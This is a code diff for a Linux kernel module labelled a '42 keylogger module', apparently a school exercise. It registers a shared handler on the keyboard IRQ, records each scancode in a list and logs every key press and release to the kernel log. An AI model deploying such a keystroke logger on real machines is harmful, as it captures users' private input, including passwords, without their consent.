@@ -8,9 +8,14 @@
 
 static LIST_HEAD(strokehead);
 
-void *line_id = (void *)0x42;
+/*
+ * This variable is used as an identifier for shared interrupt lines.
+ * Since many drivers can be loaded on the same line, free_irq needs
+ * to know what driver it should free.
+ * I set it to the address of strokehead, is it a good idea ?*/
+static void *line_id = &strokehead;
 
-static irq_handler_t toto(int irq, void *dev_id, struct pt_regs *regs)
+static irqreturn_t irq_handler(int irq, void *dev_id)
 {
 	int scancode = inb(0x60);
 	struct stroke_s *keystroke;
@@ -19,9 +24,12 @@ static irq_handler_t toto(int irq, void *dev_id, struct pt_regs *regs)
 
 	keystroke->state = scancode & 0x80;
 	keystroke->value = scancode &= ~0x80;
-	INIT_LIST_HEAD(&keystroke->list);
 	list_add_tail(&keystroke->list, &strokehead);
-	return (irq_handler_t)IRQ_HANDLED;
+	if (keystroke->state)
+		pr_info("Key = %d, RELEASED\n", keystroke->value);
+	else
+		pr_info("Key = %d, PRESSED\n", keystroke->value);
+	return IRQ_HANDLED;
 }
 
 static int __init init_keyboard(void)
@@ -29,12 +37,24 @@ static int __init init_keyboard(void)
 	int ret;
 
 	pr_info("LOADED -- 42 keylogger module.\n");
-	ret = request_irq(1, (irq_handler_t)toto, IRQF_SHARED, "my_keyboard_42", line_id);
+	ret = request_irq(1,				\
+			irq_handler,			\
+			IRQF_SHARED,			\
+			"my_keyboard_42",		\
+			line_id);
 	return 0;
 }
 
 static void __exit exit_keyboard(void)
 {
+	struct stroke_s *toto;
+	struct stroke_s *tmp;
+
+	list_for_each_entry_safe(toto, tmp, &strokehead, list)
+	{
+		printk("VALUE - %d\n", toto->value);
+		kfree(toto);
+	}
 	free_irq(1, line_id);
 	pr_info("UNLOADED -- 42 keylogger module.\n");
 }
